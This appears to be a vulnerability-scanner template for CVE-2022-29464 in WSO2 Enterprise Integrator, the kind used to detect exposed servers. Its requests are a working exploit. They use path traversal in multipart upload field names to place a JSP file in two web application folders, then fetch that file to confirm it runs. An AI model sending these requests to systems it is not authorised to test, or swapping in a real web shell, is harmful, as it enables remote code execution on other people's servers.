id: yaml-poc-wso2-enterprise_integrator-directory_traversal-CVE-2022-29464
info:
  name: Yaml Poc Wso2 Enterprise_Integrator Directory_Traversal Cve 2022 29464
  author: converted
  severity: critical
  description: 'Converted from xpoc: yaml-poc-wso2-enterprise_integrator-directory_traversal-CVE-2022-29464'
  tags: traversal,cve
  classification:
    cve-id: CVE-2022-29464
  reference:
  - http://packetstormsecurity.com/files/166921/WSO-Arbitrary-File-Upload-Remote-Code-Execution.html
  - http://www.openwall.com/lists/oss-security/2022/04/22/7
  - https://cxsecurity.com/cveshow/CVE-2022-29464/
  - https://docs.wso2.com/display/Security/Security+Advisory+WSO2-2021-1738
  - https://github.com/hakivvi/CVE-2022-29464
http:
- method: POST
  path:
  - /fileupload/toolsAny
  body: "-----------------------------250033711231076532771336998311\r\nContent-Disposition:\
    \ form-data; name=\"../../../../repository/deployment/server/jaggeryapps/publisher/{{filename}}.jsp\"\
    ;filename=\"{{filename}}.jsp\"\r\n\r\n\n<% out.print(\"{{randstr}}\"); %>\r\n\
    -----------------------------250033711231076532771336998311-- "
  headers:
    Content-Type: multipart/form-data; boundary=---------------------------250033711231076532771336998311
    Upgrade-Insecure-Requests: '1'
    urn: uploadFiles
  matchers-condition: and
  matchers:
  - type: status
    status:
    - 200
- method: POST
  path:
  - /fileupload/toolsAny
  body: "-----------------------------250033711231076532771336998311\r\nContent-Disposition:\
    \ form-data; name=\"../../../../repository/deployment/server/webapps/authenticationendpoint/{{filename}}.jsp\"\
    ;filename=\"{{filename}}.jsp\"\r\n\r\n\n<% out.print(\"{{randstr}}\"); %>\r\n\
    -----------------------------250033711231076532771336998311-- "
  headers:
    Content-Type: multipart/form-data; boundary=---------------------------250033711231076532771336998311
    Upgrade-Insecure-Requests: '1'
    urn: uploadFiles
  matchers-condition: and
  matchers:
  - type: status
    status:
    - 200
- method: GET
  path:
  - /publisher/{{filename}}.jsp
  matchers-condition: and
  matchers:
  - type: status
    status:
    - 200
